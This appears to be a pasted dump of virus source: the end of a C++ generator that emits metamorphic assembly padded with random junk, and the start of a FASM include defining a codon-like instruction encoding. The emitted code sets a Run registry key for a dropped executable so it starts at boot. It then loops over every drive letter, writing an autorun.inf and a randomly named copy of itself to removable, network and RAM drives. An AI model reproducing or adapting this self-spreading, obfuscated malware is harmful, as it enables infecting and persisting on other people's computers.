file << ""                       _add0001  ; Not finished"" << endl;
file << ""                       _JnzUp       ; Next step"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _nopREAL"" << endl;


file << ""       _pop         ; counter away from stack"" << endl; CreateAnIntron();
file << ""       _push        ; trash"" << endl; CreateAnIntron();

file << ""     RPBlock3End1:"" << endl; CreateAnIntron();
file << ""       _pop         ; return value from call"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hUnmapViewOfFile"");

GetAddress(""MapHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");

GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");


GetAddress(""AutoStartContentStart"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

GetAddress(""stSubKey"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'SOFT\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'WARE\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'\\Mic\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'roso\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ft\\W\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'indo\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ws\\C\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'urre\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ntVe\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'rsio\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'n\\Ru\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'n\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();


GetAddress(""hRegKey"");
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""stSubKey"");
file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""HKEY_LOCAL_MACHINE"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hRegCreateKeyA"");

zer0(0);
addnumber(""15"");
file << ""       _push                ; 15"" << endl; CreateAnIntron();
GetAddress(""Driveletter3"");
file << ""       _push                ; C:"" << static_cast<char>(92) << ""evolusss.exe"" << endl; CreateAnIntron();
zer0(0);
addnumber(""REG_SZ"");
file << ""       _push                ; REG_SZ"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
GetAddress(""hRegKey"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push                ; dword[hRegKey]"" << endl; CreateAnIntron();
CallAPI(""hRegSetValueExA"");

GetAddress(""AutoStartContentStart"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'[Aut\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'orun\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x530A0D5D"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'hell\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'Exec\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ute=\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""RandomFileName"");
file << ""       _nopdB"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsB"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.exe\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x73550A0D"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'eAut\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'opla\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ay=1\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

GetAddress(""autoruninf"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'auto\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'run.\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.inf\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
addnumber(""2"");
file << ""       _push                ; 0x2"" << endl; CreateAnIntron();
zer0(0);
addnumber(""CREATE_ALWAYS"");
file << ""       _push                ; CREATE_ALWAYS"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
addnumber(""0xC0000000"");
file << ""       _push                ; 0xC0000000"" << endl; CreateAnIntron();
GetAddress(""autoruninf"");
file << ""       _push                ; autoruninf"" << endl; CreateAnIntron();
CallAPI(""hCreateFileA"");

GetAddress(""FileHandle"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord           ; dword[FileHandle]=eax"" << endl; CreateAnIntron();

zer0(0);
file << ""       _push                 ; 0x0"" << endl; CreateAnIntron();
GetAddress(""MapHandle"");
file << ""       _push                 ; Trash-Address"" << endl; CreateAnIntron();
zer0(0);
addnumber(""(AutoStartContentEnd-AutoStartContentStart)"");
file << ""       _push                 ; Size of Buffer"" << endl; CreateAnIntron();
GetAddress(""AutoStartContentStart"");
file << ""       _push                 ; Buffer to write"" << endl; CreateAnIntron();
GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push                 ; FileHandle"" << endl; CreateAnIntron();
CallAPI(""hWriteFile"");

GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");

file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff                  ; Loop over Drive Letter A-Z"" << endl; CreateAnIntron();

file << ""       _pushall"" << endl; CreateAnIntron();
zer0(0);
file << ""               _nopdB                       ; RegB=0"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter1-1"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x003A4100"");
file << ""               _writeDWord"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter2-1"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x5C3A4100"");
file << ""               _writeDWord"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(0);
addnumber(""26"");
file << ""               _nopdA                       ; counter"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""               _getEIP"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _saveJmpOff                  ; Loop over Drive Letter A-Z"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter1+2"");
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();
zer0(1);
file << ""                       _writeByte"" << endl; CreateAnIntron();

GetAddress(""Driveletter1"");
file << ""                       _push"" << endl; CreateAnIntron();
CallAPI(""hGetDriveTypeA"");

file << ""                       _nopsA"" << endl; CreateAnIntron();
file << ""                       _save        ; save Drive type"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""2"");
subsaved(1);
file << ""                       _JnzDown     ; Is DRIVE_REMOVABLE?"" << endl;
file << ""                           _pop      ; Stack=0x0010"" << endl;
file << ""                           _push"" << endl;
file << ""                           _nopdB    ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0040"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""3"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_FIXED?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0040 -> FILE"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""4"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_REMOTE?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;


zer0(1);
addnumber(""6"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_RAMDISK?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

file << ""               ; ############################################################################"" << endl; CreateAnIntron();
file << ""               ; ##### Copy autorun.inf (or not)"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""autoruninf"");
file << ""                       _nopdA               ; address to "" << static_cast<char>(34) << ""autorun.inf"" << static_cast<char>(34) << "" to RegA"" << endl; CreateAnIntron();
GetAddress(""Driveletter2"");
file << ""                       _nopdD               ; address to "" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""autorun.inf"" << static_cast<char>(34) << "" to RegD"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _save"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopREAL             ; BC1=0x0"" << endl;
file << ""                           _push                ; bFailIfExists=FALSE"" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _push                ; lpNewFileName="" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""autorun.inf"" << static_cast<char>(34) << """" << endl;
file << ""               "" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
GetAddress(""hCopyFileA"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdD"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopsA"" << endl;
file << ""                           _push                ; lpExistingFileName="" << static_cast<char>(34) << ""autorun.inf"" << static_cast<char>(34) << """" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _call                ; stdcall dword[hCopyFileA]"" << endl;
file << ""       "" << endl; CreateAnIntron();

file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _save                ; restore BC2 (=RegB)"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0040"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _save             ; also copy child executable"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

file << ""               "" << endl; CreateAnIntron();
file << ""               ; ##### End Copy autorun.inf (or not)"" << endl; CreateAnIntron();
file << ""               ; ############################################################################"" << endl; CreateAnIntron();


file << ""               ; ############################################################################"" << endl; CreateAnIntron();
file << ""               ; ##### Copy child executable (or not)"" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
GetAddress(""Driveletter1+2"");
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x5C"");
file << ""                       _writeByte"" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
GetAddress(""RandomFileName"");
file << ""                       _nopdA               ; address to "" << static_cast<char>(34) << ""NNNNNNNN.exe"" << static_cast<char>(34) << "" to RegA"" << endl; CreateAnIntron();
GetAddress(""Driveletter1"");
file << ""                       _nopdD               ; address to "" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""NNNNNNNN.exe"" << static_cast<char>(34) << "" to RegD"" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _save"" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0040"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopREAL"" << endl;
file << ""                           _push                ; bFailIfExists=FALSE"" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _push                ; lpNewFileName="" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""NNNNNNNN.exe"" << static_cast<char>(34) << """" << endl;
file << ""               "" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
GetAddress(""hCopyFileA"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdD"" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0040"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopsA"" << endl;
file << ""                           _push                ; lpExistingFileName="" << static_cast<char>(34) << ""NNNNNNNN.exe"" << static_cast<char>(34) << """" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _call                ; stdcall dword[hCopyFileA]"" << endl;

file << ""               ; ##### End Copy child executable (or not)"" << endl; CreateAnIntron();
file << ""               ; ############################################################################"" << endl; CreateAnIntron();

file << ""               _popall"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter1"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _getdata"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _writeByte"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter2"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _getdata"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _writeByte"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""               _JnzUp"" << endl; CreateAnIntron();

file << ""       _popall"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x6666"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hSleep"");


zer0(0);
addnumber(""1"");
file << ""       _JnzUp"" << endl; CreateAnIntron();

file << """" << endl;
file << ""EndAminoAcids1:"" << endl;
file << """" << endl;
file << ""; ##################################################################"" << endl;
file << """" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << ""EndAmino:"" << endl;
for (int i=0; i<500; i++) { CreateAnIntron(); }
file << "".end start"";

        
    file.close();
    cout << ""Created:"" << endl;
    cout << ""Translator Introns: "" << cIntronN << endl;
    cout << ""Codon Start/Stop Introns: "" << IntronSTST << endl;
    cout << ""Codon NOP Introns: "" << IntronNOP << endl << endl;    
    cout << ""Finish :)"" << endl;
    //cin.get();
    return(666);
}"
RRQpXpgy,alphabeth.inc,FlyFar,MPASM,Thursday 27th of July 2023 01:56:05 AM CDT,"InstructionSetSize=37 ; It is 32, but 32=2^N, thus very bad for LCG
		      ; 37 is the next bigger prime, thus=good ;)
AminoAcidList FIX @nopREAL,@nopsA,@nopsB,@nopsD,@nopdA,@nopdB,@nopdD,@save,@addsaved,@saveWrtOff,@saveJmpOff,@writeByte,@writeDWord,@getDO,@getdata,@getEIP,@push,@pop,@pushall,@popall,@add0001,@sub0001,@shl,@shr,@xor,@and,@mul,@div,@JnzUp,@JnzDown,@call,@CallAPILoadLibrary

_START EQU StartCodon
_STOP EQU StopCodon

MAX_NUMBER = 999'999'999'999'999'999



macro displayDecNum num* ; useful for debugging
{
    dN1=  num MOD 10
    dN2= ((num-dN1)/10) MOD 10
    dN3= ((num-dN1-dN2)/100) MOD 10
    dN4= ((num-dN1-dN2-dN3)/1'000) MOD 10
    dN5= ((num-dN1-dN2-dN3-dN4)/10'000) MOD 10
    dN6= ((num-dN1-dN2-dN3-dN4-dN5)/100'000) MOD 10
    dN7= ((num-dN1-dN2-dN3-dN4-dN5-dN6)/1'000'000) MOD 10
    dN8= ((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7)/10'000'000) MOD 10
    dN9= ((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8)/100'000'000) MOD 10
    dN10=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9)/1'000'000'000) MOD 10
    dN11=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10)/10'000'000'000) MOD 10
    dN12=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11)/100'000'000'000) MOD 10
    dN13=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12)/1'000'000'000'000) MOD 10
    dN14=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13)/10'000'000'000'000) MOD 10
    dN15=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14)/100'000'000'000'000) MOD 10
    dN16=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15)/1'000'000'000'000'000) MOD 10
    dN17=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15-dN16)/10'000'000'000'000'000) MOD 10
    dN18=((num-dN1-dN2-dN3-dN4-dN5-dN6-dN7-dN8-dN9-dN10-dN11-dN12-dN13-dN14-dN15-dN16-dN17)/100'000'000'000'000'000) MOD 10
    display dN18+'0',dN17+'0',dN16+'0',dN15+'0',dN14+'0',dN13+'0',dN12+'0',dN11+'0',dN10+'0',dN9+'0',dN8+'0',dN7+'0',dN6+'0',dN5+'0',dN4+'0',dN3+'0',dN2+'0',dN1+'0',13,10
}

macro displayList list*
{
    display '0: '
    displayDecNum list#0
    display '1: '
    displayDecNum list#1
    display '2: '
    displayDecNum list#2
    display '3: '
    displayDecNum list#3
    display '4: '
    displayDecNum list#4
    display '5: '
    displayDecNum list#5
    display '6: '
    displayDecNum list#6
    display '7: '
    displayDecNum list#7
    display '8: '
    displayDecNum list#8
    display '9: '
    displayDecNum list#9

}


macro appendToList list*, codon*
{
    if list#0<(MAX_NUMBER/1'000)
	list#0=(list#0*1'000)+codon
    else if list#1<(MAX_NUMBER/1'000)
	list#1=(list#1*1'000)+codon
    else if list#2<(MAX_NUMBER/1'000)
	list#2=(list#2*1'000)+codon
    else if list#3<(MAX_NUMBER/1'000)
	list#3=(list#3*1'000)+codon
    else if list#4<(MAX_NUMBER/1'000)
	list#4=(list#4*1'000)+codon
    else if list#5<(MAX_NUMBER/1'000)
	list#5=(list#5*1'000)+codon
    else if list#6<(MAX_NUMBER/1'000)
	list#6=(list#6*1'000)+codon
    else if list#7<(MAX_NUMBER/1'000)
	list#7=(list#7*1'000)+codon
    else if list#8<(MAX_NUMBER/1'000)
	list#8=(list#8*1'000)+codon
    else if list#9<(MAX_NUMBER/1'000)
	list#9=(list#9*1'000)+codon
    else
	display ""Too much codons added"",13,10,"" for one amino acid""
	err
	; 10*6+1=61 codons map to one amino acid...
    end if
}


getListSizeRV = 0
macro getListSize list*
{
    multiplicator=0
    number=list#0
    if list#9>0
	multiplicator=9
	number=list#9
    else if list#8>0
	multiplicator=8
	number=list#8
    else if list#7>0
	multiplicator=7
	number=list#7
    else if list#6>0
	multiplicator=6
	number=list#6
    else if list#5>0
	multiplicator=5
	number=list#5
    else if list#4>0
	multiplicator=4
	number=list#4
    else if list#3>0
	multiplicator=3
	number=list#3
    else if list#2>0
	multiplicator=2
	number=list#2
    else if list#1>0
	multiplicator=1
	number=list#1
    end if

    addend = 0
    while number>0
	addend=addend+1
	number=number/1000
    end while

    getListSizeRV=(multiplicator*6+addend)
}


getItemRV=0
IsJnzDown=0
macro getItem list*, index*
{
; gives elements in a special order: starting from list#0[5]...list#0[0] -> list#1[5]...list#2[0]
; could be changed, but no need for that as it will be only called by getRandomItem.

    getListSize list

    number=0
    if index<getListSizeRV
	if (index/(9*6))>0
	    number=list#9
	else if (index/(8*6))>0
	    number=list#8
	else if (index/(7*6))>0
	    number=list#7
	else if (index/(6*6))>0
	    number=list#6
	else if (index/(5*6))>0
	    number=list#5
	else if (index/(4*6))>0
	    number=list#4
	else if (index/(3*6))>0
	    number=list#3
	else if (index/(2*6))>0
	    number=list#2
	else if (index/(1*6))>0
	    number=list#1
	else
	    number=list#0
	end if

	newindex=index MOD 6

	while newindex>0
	    number=number/1000
	    newindex=newindex-1
	end while

	getItemRV=number MOD 1000

    else
	display 'Tried to access an element',13,10,'that doesnt exist'
	err
    end if

    list#42=list#42+1
}


macro getRandomItem list*
{
    getListSize list
    GetNewRandomNumber
    RndElement = (RndNum SHR 16) MOD getListSizeRV

    getItem list, RndElement

    db getItemRV

;    displayDecNum getItemRV

}


macro CreateEmptyList list*
{
    list#0 = 0
    list#1 = 0
    list#2 = 0
    list#3 = 0
    list#4 = 0
    list#5 = 0
    list#6 = 0
    list#7 = 0
    list#8 = 0
    list#9 = 0

    list#42 = 0     ; How often a codon called an amino acid

    list#666 = 0    ; How much different codons map one amino acid
}

macro CalculateListSizeOfAminoAcids [AminoAcid]
{
    getListSize AminoAcid#.list
    AminoAcid#.list666=getListSizeRV
    display `AminoAcid,': '
    displayDecNum AminoAcid#.list666
}


macro displayAminoAcidDistribution [AminoAcid]
{
    display `AminoAcid,': '
    displayDecNum AminoAcid#.list42
}


;macro CreateAnIntron
;{
;    GetNewRandomNumber
;    if ((RndNum SHR 16) MOD IntronInsertThreshold)=0

;        WhichIntron=((RndNum SHR 16) MOD 3)
;        if WhichIntron=0
;            db StopCodon
;        end if

;        GetNewRandomNumber

;        while ((RndNum SHR 16) MOD 37)<>0
;            GetNewRandomNumber
;            RRR=((RndNum SHR 16) MOD 255)
;            if WhichIntron=0
;                db (RRR XOR 0x67)
;            else
;                db (RRR OR 0x91)
;            end if
;        end while

;        if WhichIntron=0
;            db StartCodon
;        end if
;    end if
;}


macro CreatePaddedInstruction instr*, op1, op2
{
    virtual at 0
	if op2 eq
	    if op1 eq
		instr
	    else
		instr op1
	    end if
	else
	    instr op1,op2
	end if
	InstrSize = $
    end virtual

    GetNewRandomNumber
    NOPsBefore=(RndNum MOD (8-InstrSize+1))


    times NOPsBefore: nop

    if op2 eq
	if op1 eq
	    instr
	else
	    instr op1
	end if
    else
	instr op1,op2
    end if

    times (8-InstrSize-NOPsBefore): nop
}


; @command.list ... list that contains all codons that point to the amino acid
; @command ... macro that returns the amino acid and creates the @command.list
; _command ... how one actually calls the command (will return a random codon from @command)

CreateEmptyList @nopREAL.list
macro @nopREAL codon*
{
    CreatePaddedInstruction nop
    appendToList @nopREAL.list, codon
}
macro _nopREAL { getRandomItem @nopREAL.list }

; - - -


CreateEmptyList  @nopsA.list
macro @nopsA codon*
{
    CreatePaddedInstruction mov, ebx, eax
